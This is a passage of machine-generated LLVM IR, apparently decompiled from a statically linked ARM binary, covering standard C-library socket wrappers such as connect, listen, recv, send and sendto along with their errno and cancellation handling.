dec_label_pc_115b0:
  %v0_115b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_115b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_115b0
  %v2_115b0 = load i32, i32* @sl, align 4
  %v8_115b0 = shl i32 %v2_115b0, %arg2
  %v9_115b0 = and i32 %v8_115b0, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_115b0, %bb
  %v4_115b4 = phi i32 [ %arg1, %dec_label_pc_115b0 ], [ %v9_115b0, %bb ]
  ret i32 %v4_115b4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_115b8 = load i32, i32* @r7, align 4
  store i32 %v3_115b8, i32* %stack_var_-8, align 4
  %v0_115c4 = load i32, i32* @r0, align 4
  store i32 %v0_115c4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_115c4, -4095
  br i1 %tmp, label %dec_label_pc_115ec, label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %entry
  %v0_115d8 = call i32 @__aeabi_read_tp()
  %v3_115dc = load i16, i16* @global_var_21a38.351, align 2
  %v4_115dc = sext i16 %v3_115dc to i32
  store i32 %v4_115dc, i32* @r3, align 4
  %v0_115e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_115e0 = sub i32 0, %v0_115e0
  store i32 %v1_115e0, i32* %r2.global-to-local, align 4
  %v3_115e4 = add i32 %v4_115dc, %v0_115d8
  %v4_115e4 = inttoptr i32 %v3_115e4 to i32*
  store i32 %v1_115e0, i32* %v4_115e4, align 4
  %v2_115ec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_115ec

dec_label_pc_115ec:                               ; preds = %entry, %dec_label_pc_115d4
  %v1_115f0 = phi i32 [ %v0_115c4, %entry ], [ -1, %dec_label_pc_115d4 ]
  %v2_115ec = phi i32 [ %v3_115b8, %entry ], [ %v2_115ec.pre, %dec_label_pc_115d4 ]
  store i32 %v2_115ec, i32* @r7, align 4
  ret i32 %v1_115f0

; uselistorder directives
  uselistorder i32 %v0_115c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_115ec, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_115f4:
  %v0_115f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_115f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_115f4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_115f4, %bb
  %v10_115f8 = phi i32 [ %arg1, %dec_label_pc_115f4 ], [ 0, %bb ]
  ret i32 %v10_115f8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11600 = load i32, i32* @r4, align 4
  store i32 %v3_11600, i32* %stack_var_-20, align 4
  %v6_11600 = load i32, i32* @r5, align 4
  %v9_11600 = load i32, i32* @r6, align 4
  %v12_11600 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r3, align 4
  %v4_1160c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  store i32 %v4_1160c, i32* @ip, align 4
  %v2_11610 = icmp eq i32 %v4_1160c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11610, label %dec_label_pc_11628, label %entry.dec_label_pc_11634_crit_edge

entry.dec_label_pc_11634_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11634

dec_label_pc_11628:                               ; preds = %entry
  store i32 %v3_11600, i32* @r4, align 4
  store i32 %v9_11600, i32* @r6, align 4
  store i32 %v12_11600, i32* @r7, align 4
  %v0_11630 = call i32 @__sys_connect()
  br label %dec_label_pc_11634

dec_label_pc_11634:                               ; preds = %entry.dec_label_pc_11634_crit_edge, %dec_label_pc_11628
  %v0_11634 = call i32 @__libc_enable_asynccancel()
  %v0_11638 = load i32, i32* @r6, align 4
  store i32 %v0_11638, i32* @r1, align 4
  store i32 %v0_11634, i32* @r5, align 4
  %v0_11644 = load i32, i32* @r4, align 4
  store i32 %v0_11644, i32* @r0, align 4
  %v0_11648 = call i32 @__sys_connect()
  store i32 %v0_11648, i32* @r4, align 4
  %v0_11650 = load i32, i32* @r5, align 4
  %v1_11654 = call i32 @__libc_disable_asynccancel(i32 %v0_11650)
  %v0_11658 = load i32, i32* @r4, align 4
  %v2_11660 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11660, i32* @r4, align 4
  store i32 %v6_11600, i32* @r5, align 4
  store i32 %v9_11600, i32* @r6, align 4
  store i32 %v12_11600, i32* @r7, align 4
  ret i32 %v0_11658

; uselistorder directives
  uselistorder label %dec_label_pc_11634, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11670 = load i32, i32* @r7, align 4
  store i32 %v3_11670, i32* %stack_var_-8, align 4
  %v0_1167c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1167c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1167c, -4095
  br i1 %tmp, label %dec_label_pc_116a4, label %dec_label_pc_1168c

dec_label_pc_1168c:                               ; preds = %entry
  %v0_11690 = call i32 @__aeabi_read_tp()
  %v3_11694 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11694 = sext i16 %v3_11694 to i32
  %v0_11698 = load i32, i32* %r2.global-to-local, align 4
  %v1_11698 = sub i32 0, %v0_11698
  store i32 %v1_11698, i32* %r2.global-to-local, align 4
  %v3_1169c = add i32 %v4_11694, %v0_11690
  %v4_1169c = inttoptr i32 %v3_1169c to i32*
  store i32 %v1_11698, i32* %v4_1169c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_116a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_116a4

dec_label_pc_116a4:                               ; preds = %entry, %dec_label_pc_1168c
  %v1_116a8 = phi i32 [ %v0_1167c, %entry ], [ -1, %dec_label_pc_1168c ]
  %v2_116a4 = phi i32 [ %v3_11670, %entry ], [ %v2_116a4.pre, %dec_label_pc_1168c ]
  store i32 %v2_116a4, i32* @r7, align 4
  ret i32 %v1_116a8

; uselistorder directives
  uselistorder i32 %v0_1167c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_116a4, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_116ac:
  %v0_116ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_116ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_116ac
  %v2_116ac = load i32, i32* @lr, align 4
  %v8_116ac = shl i32 %v2_116ac, %arg2
  %v9_116ac = and i32 %v8_116ac, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_116ac, %bb
  %v4_116b0 = phi i32 [ %arg1, %dec_label_pc_116ac ], [ %v9_116ac, %bb ]
  ret i32 %v4_116b0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_116b4 = load i32, i32* @r4, align 4
  store i32 %v3_116b4, i32* %stack_var_-12, align 4
  %v0_116c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_116c4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_116c4, -4095
  br i1 %tmp, label %dec_label_pc_116ec, label %dec_label_pc_116d4

dec_label_pc_116d4:                               ; preds = %entry
  %v0_116d8 = call i32 @__aeabi_read_tp()
  %v3_116dc = load i16, i16* @global_var_21a38.351, align 2
  %v4_116dc = sext i16 %v3_116dc to i32
  %v0_116e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_116e0 = sub i32 0, %v0_116e0
  store i32 %v1_116e0, i32* %r2.global-to-local, align 4
  %v3_116e4 = add i32 %v4_116dc, %v0_116d8
  %v4_116e4 = inttoptr i32 %v3_116e4 to i32*
  store i32 %v1_116e0, i32* %v4_116e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_116ec.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_116ec

dec_label_pc_116ec:                               ; preds = %entry, %dec_label_pc_116d4
  %v1_116f0 = phi i32 [ %v0_116c4, %entry ], [ -1, %dec_label_pc_116d4 ]
  %v2_116ec = phi i32 [ %v3_116b4, %entry ], [ %v2_116ec.pre, %dec_label_pc_116d4 ]
  store i32 %v2_116ec, i32* @r4, align 4
  ret i32 %v1_116f0

; uselistorder directives
  uselistorder i32 %v0_116c4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_116ec, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_116f4:
  %v0_116f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_116f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_116f4
  %v2_116f8 = load i32, i32* @r4, align 4
  %v8_116f8 = ashr i32 %v2_116f8, %arg3
  %v9_116f8 = and i32 %v8_116f8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_116f4, %bb
  %v10_116f8 = phi i32 [ %arg1, %dec_label_pc_116f4 ], [ %v9_116f8, %bb ]
  ret i32 %v10_116f8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_116fc = load i32, i32* @r7, align 4
  store i32 %v3_116fc, i32* %stack_var_-8, align 4
  %v0_11708 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11708, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11708, -4095
  br i1 %tmp, label %dec_label_pc_11730, label %dec_label_pc_11718

dec_label_pc_11718:                               ; preds = %entry
  %v0_1171c = call i32 @__aeabi_read_tp()
  %v3_11720 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11720 = sext i16 %v3_11720 to i32
  %v0_11724 = load i32, i32* %r2.global-to-local, align 4
  %v1_11724 = sub i32 0, %v0_11724
  store i32 %v1_11724, i32* %r2.global-to-local, align 4
  %v3_11728 = add i32 %v4_11720, %v0_1171c
  %v4_11728 = inttoptr i32 %v3_11728 to i32*
  store i32 %v1_11724, i32* %v4_11728, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11730.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11730

dec_label_pc_11730:                               ; preds = %entry, %dec_label_pc_11718
  %v1_11734 = phi i32 [ %v0_11708, %entry ], [ -1, %dec_label_pc_11718 ]
  %v2_11730 = phi i32 [ %v3_116fc, %entry ], [ %v2_11730.pre, %dec_label_pc_11718 ]
  store i32 %v2_11730, i32* @r7, align 4
  ret i32 %v1_11734

; uselistorder directives
  uselistorder i32 %v0_11708, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11730, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1173c = load i32, i32* @r7, align 4
  store i32 %v3_1173c, i32* %stack_var_-8, align 4
  %v0_11748 = load i32, i32* @r0, align 4
  store i32 %v0_11748, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11748, -4095
  br i1 %tmp, label %dec_label_pc_11770, label %dec_label_pc_11758

dec_label_pc_11758:                               ; preds = %entry
  %v0_1175c = call i32 @__aeabi_read_tp()
  %v3_11760 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11760 = sext i16 %v3_11760 to i32
  %v0_11764 = load i32, i32* %r2.global-to-local, align 4
  %v1_11764 = sub i32 0, %v0_11764
  store i32 %v1_11764, i32* %r2.global-to-local, align 4
  %v3_11768 = add i32 %v4_11760, %v0_1175c
  %v4_11768 = inttoptr i32 %v3_11768 to i32*
  store i32 %v1_11764, i32* %v4_11768, align 4
  %v2_11770.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11770

dec_label_pc_11770:                               ; preds = %entry, %dec_label_pc_11758
  %v1_11774 = phi i32 [ %v0_11748, %entry ], [ -1, %dec_label_pc_11758 ]
  %v2_11770 = phi i32 [ %v3_1173c, %entry ], [ %v2_11770.pre, %dec_label_pc_11758 ]
  store i32 %v2_11770, i32* @r7, align 4
  ret i32 %v1_11774

; uselistorder directives
  uselistorder i32 %v0_11748, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11770, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i64* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11778:
  %v0_11778 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11778, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11778
  %v4_1177c = load i64, i64* %arg2, align 4
  %v7_1177c = udiv i64 %v4_1177c, 4294967296
  %v8_1177c = trunc i64 %v7_1177c to i32
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11778, %bb
  %v11_1177c = phi i32 [ %arg1, %dec_label_pc_11778 ], [ %v8_1177c, %bb ]
  ret i32 %v11_1177c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11784 = load i32, i32* @r4, align 4
  store i32 %v3_11784, i32* %stack_var_-24, align 4
  %v6_11784 = load i32, i32* @r5, align 4
  %v9_11784 = load i32, i32* @r6, align 4
  %v12_11784 = load i32, i32* @r7, align 4
  %v15_11784 = load i32, i32* @r8, align 4
  %v18_11784 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @ip, align 4
  %v4_11790 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  %v2_11794 = icmp eq i32 %v4_11790, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11794, label %dec_label_pc_117ac, label %entry.dec_label_pc_117b4_crit_edge

entry.dec_label_pc_117b4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_117b4

dec_label_pc_117ac:                               ; preds = %entry
  store i32 %v3_11784, i32* @r4, align 4
  store i32 %v9_11784, i32* @r6, align 4
  store i32 %v12_11784, i32* @r7, align 4
  store i32 %v15_11784, i32* @r8, align 4
  %v0_117b0 = call i32 @__sys_recv()
  br label %dec_label_pc_117b4

dec_label_pc_117b4:                               ; preds = %entry.dec_label_pc_117b4_crit_edge, %dec_label_pc_117ac
  %v0_117b4 = call i32 @__libc_enable_asynccancel()
  %v0_117b8 = load i32, i32* @r6, align 4
  store i32 %v0_117b8, i32* @r1, align 4
  store i32 %v0_117b4, i32* @r5, align 4
  %v0_117c8 = load i32, i32* @r4, align 4
  store i32 %v0_117c8, i32* @r0, align 4
  %v0_117cc = call i32 @__sys_recv()
  store i32 %v0_117cc, i32* @r4, align 4
  %v0_117d4 = load i32, i32* @r5, align 4
  %v1_117d8 = call i32 @__libc_disable_asynccancel(i32 %v0_117d4)
  %v0_117dc = load i32, i32* @r4, align 4
  %v2_117e0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_117e0, i32* @r4, align 4
  store i32 %v6_11784, i32* @r5, align 4
  store i32 %v9_11784, i32* @r6, align 4
  store i32 %v12_11784, i32* @r7, align 4
  store i32 %v15_11784, i32* @r8, align 4
  store i32 %v18_11784, i32* @lr, align 4
  ret i32 %v0_117dc

; uselistorder directives
  uselistorder label %dec_label_pc_117b4, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_117f0 = load i32, i32* @r4, align 4
  store i32 %v3_117f0, i32* %stack_var_-16, align 4
  %v0_11804 = load i32, i32* @r0, align 4
  store i32 %v0_11804, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11804, -4095
  br i1 %tmp, label %dec_label_pc_1182c, label %dec_label_pc_11814

dec_label_pc_11814:                               ; preds = %entry
  %v0_11818 = call i32 @__aeabi_read_tp()
  %v3_1181c = load i16, i16* @global_var_21a38.351, align 2
  %v4_1181c = sext i16 %v3_1181c to i32
  %v0_11820 = load i32, i32* %r2.global-to-local, align 4
  %v1_11820 = sub i32 0, %v0_11820
  store i32 %v1_11820, i32* %r2.global-to-local, align 4
  %v3_11824 = add i32 %v4_1181c, %v0_11818
  %v4_11824 = inttoptr i32 %v3_11824 to i32*
  store i32 %v1_11820, i32* %v4_11824, align 4
  %v2_1182c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1182c

dec_label_pc_1182c:                               ; preds = %entry, %dec_label_pc_11814
  %v1_11830 = phi i32 [ %v0_11804, %entry ], [ -1, %dec_label_pc_11814 ]
  %v2_1182c = phi i32 [ %v3_117f0, %entry ], [ %v2_1182c.pre, %dec_label_pc_11814 ]
  store i32 %v2_1182c, i32* @r4, align 4
  ret i32 %v1_11830

; uselistorder directives
  uselistorder i32 %v0_11804, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1182c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11838 = load i32, i32* @r4, align 4
  store i32 %v3_11838, i32* %stack_var_-32, align 4
  %v6_11838 = load i32, i32* @r5, align 4
  %v9_11838 = load i32, i32* @r6, align 4
  %v12_11838 = load i32, i32* @r7, align 4
  %v15_11838 = load i32, i32* @r8, align 4
  %v18_11838 = load i32, i32* @sb, align 4
  %v21_11838 = load i32, i32* @sl, align 4
  %v24_11838 = load i32, i32* @lr, align 4
  %v4_11848 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  %v2_11850 = icmp eq i32 %v4_11848, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11850, label %dec_label_pc_11870, label %dec_label_pc_1187c

dec_label_pc_11870:                               ; preds = %entry
  store i32 %v3_11838, i32* @r4, align 4
  store i32 %v12_11838, i32* @r7, align 4
  store i32 %v15_11838, i32* @r8, align 4
  store i32 %v18_11838, i32* %sb.global-to-local, align 4
  %v0_11878 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_1187c

dec_label_pc_1187c:                               ; preds = %entry, %dec_label_pc_11870
  %v0_1187c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1187c, i32* @r5, align 4
  %v0_11890 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11890, i32* @r0, align 4
  %v0_11898 = call i32 @__sys_recvfrom()
  store i32 %v0_11898, i32* @r4, align 4
  %v0_118a0 = load i32, i32* @r5, align 4
  %v1_118a4 = call i32 @__libc_disable_asynccancel(i32 %v0_118a0)
  %v0_118a8 = load i32, i32* @r4, align 4
  %v2_118b0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_118b0, i32* @r4, align 4
  store i32 %v6_11838, i32* @r5, align 4
  store i32 %v9_11838, i32* @r6, align 4
  store i32 %v12_11838, i32* @r7, align 4
  store i32 %v15_11838, i32* @r8, align 4
  store i32 %v18_11838, i32* @sb, align 4
  store i32 %v21_11838, i32* @sl, align 4
  store i32 %v24_11838, i32* @lr, align 4
  ret i32 %v0_118a8

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1187c, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_118c0 = load i32, i32* @r7, align 4
  store i32 %v3_118c0, i32* %stack_var_-8, align 4
  %v0_118cc = load i32, i32* @r0, align 4
  store i32 %v0_118cc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_118cc, -4095
  br i1 %tmp, label %dec_label_pc_118f4, label %dec_label_pc_118dc

dec_label_pc_118dc:                               ; preds = %entry
  %v0_118e0 = call i32 @__aeabi_read_tp()
  %v3_118e4 = load i16, i16* @global_var_21a38.351, align 2
  %v4_118e4 = sext i16 %v3_118e4 to i32
  store i32 %v4_118e4, i32* @r3, align 4
  %v0_118e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_118e8 = sub i32 0, %v0_118e8
  store i32 %v1_118e8, i32* %r2.global-to-local, align 4
  %v3_118ec = add i32 %v4_118e4, %v0_118e0
  %v4_118ec = inttoptr i32 %v3_118ec to i32*
  store i32 %v1_118e8, i32* %v4_118ec, align 4
  %v2_118f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_118f4

dec_label_pc_118f4:                               ; preds = %entry, %dec_label_pc_118dc
  %v1_118f8 = phi i32 [ %v0_118cc, %entry ], [ -1, %dec_label_pc_118dc ]
  %v2_118f4 = phi i32 [ %v3_118c0, %entry ], [ %v2_118f4.pre, %dec_label_pc_118dc ]
  store i32 %v2_118f4, i32* @r7, align 4
  ret i32 %v1_118f8

; uselistorder directives
  uselistorder i32 %v0_118cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_118f4, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_118fc:
  %v0_118fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_118fc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_118fc
  %v2_11900 = load i32, i32* @ip, align 4
  %v5_11900 = sdiv i32 %v2_11900, 4
  %v6_11900 = and i32 %v5_11900, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_118fc, %bb
  %v7_11900 = phi i32 [ %arg1, %dec_label_pc_118fc ], [ %v6_11900, %bb ]
  ret i32 %v7_11900

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11908 = load i32, i32* @r4, align 4
  store i32 %v3_11908, i32* %stack_var_-24, align 4
  %v6_11908 = load i32, i32* @r5, align 4
  %v9_11908 = load i32, i32* @r6, align 4
  %v12_11908 = load i32, i32* @r7, align 4
  %v15_11908 = load i32, i32* @r8, align 4
  %v18_11908 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @ip, align 4
  %v4_11914 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  %v2_11918 = icmp eq i32 %v4_11914, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11918, label %dec_label_pc_11930, label %entry.dec_label_pc_11938_crit_edge

entry.dec_label_pc_11938_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11938

dec_label_pc_11930:                               ; preds = %entry
  store i32 %v3_11908, i32* @r4, align 4
  store i32 %v9_11908, i32* @r6, align 4
  store i32 %v12_11908, i32* @r7, align 4
  store i32 %v15_11908, i32* @r8, align 4
  %v0_11934 = call i32 @__sys_send()
  br label %dec_label_pc_11938

dec_label_pc_11938:                               ; preds = %entry.dec_label_pc_11938_crit_edge, %dec_label_pc_11930
  %v0_11938 = call i32 @__libc_enable_asynccancel()
  %v0_1193c = load i32, i32* @r6, align 4
  store i32 %v0_1193c, i32* @r1, align 4
  store i32 %v0_11938, i32* @r5, align 4
  %v0_11948 = load i32, i32* @r8, align 4
  store i32 %v0_11948, i32* @r3, align 4
  %v0_1194c = load i32, i32* @r4, align 4
  store i32 %v0_1194c, i32* @r0, align 4
  %v0_11950 = call i32 @__sys_send()
  store i32 %v0_11950, i32* @r4, align 4
  %v0_11958 = load i32, i32* @r5, align 4
  %v1_1195c = call i32 @__libc_disable_asynccancel(i32 %v0_11958)
  %v0_11960 = load i32, i32* @r4, align 4
  %v2_11964 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11964, i32* @r4, align 4
  store i32 %v6_11908, i32* @r5, align 4
  store i32 %v9_11908, i32* @r6, align 4
  store i32 %v12_11908, i32* @r7, align 4
  store i32 %v15_11908, i32* @r8, align 4
  store i32 %v18_11908, i32* @lr, align 4
  ret i32 %v0_11960

; uselistorder directives
  uselistorder label %dec_label_pc_11938, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11974 = load i32, i32* @r4, align 4
  store i32 %v3_11974, i32* %stack_var_-16, align 4
  %v0_11988 = load i32, i32* @r0, align 4
  store i32 %v0_11988, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11988, -4095
  br i1 %tmp, label %dec_label_pc_119b0, label %dec_label_pc_11998

dec_label_pc_11998:                               ; preds = %entry
  %v0_1199c = call i32 @__aeabi_read_tp()
  %v3_119a0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_119a0 = sext i16 %v3_119a0 to i32
  %v0_119a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_119a4 = sub i32 0, %v0_119a4
  store i32 %v1_119a4, i32* %r2.global-to-local, align 4
  %v3_119a8 = add i32 %v4_119a0, %v0_1199c
  %v4_119a8 = inttoptr i32 %v3_119a8 to i32*
  store i32 %v1_119a4, i32* %v4_119a8, align 4
  %v2_119b0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_119b0

dec_label_pc_119b0:                               ; preds = %entry, %dec_label_pc_11998
  %v1_119b4 = phi i32 [ %v0_11988, %entry ], [ -1, %dec_label_pc_11998 ]
  %v2_119b0 = phi i32 [ %v3_11974, %entry ], [ %v2_119b0.pre, %dec_label_pc_11998 ]
  store i32 %v2_119b0, i32* @r4, align 4
  ret i32 %v1_119b4

; uselistorder directives
  uselistorder i32 %v0_11988, { 1, 0, 2 }
  uselistorder label %dec_label_pc_119b0, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_119b8:
  %v0_119b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_119b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_119b8
  %v5_119b8 = udiv i32 %arg2, 4
  %v6_119b8 = and i32 %v5_119b8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_119b8, %bb
  %v4_119bc = phi i32 [ %arg1, %dec_label_pc_119b8 ], [ %v6_119b8, %bb ]
  ret i32 %v4_119bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_119c0 = load i32, i32* @r4, align 4
  store i32 %v3_119c0, i32* %stack_var_-32, align 4
  %v6_119c0 = load i32, i32* @r5, align 4
  %v9_119c0 = load i32, i32* @r6, align 4
  %v12_119c0 = load i32, i32* @r7, align 4
  %v15_119c0 = load i32, i32* @r8, align 4
  %v18_119c0 = load i32, i32* @sb, align 4
  %v21_119c0 = load i32, i32* @sl, align 4
  %v24_119c0 = load i32, i32* @lr, align 4
  %v4_119d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  %v2_119d8 = icmp eq i32 %v4_119d0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_119d8, label %dec_label_pc_119f8, label %dec_label_pc_11a04

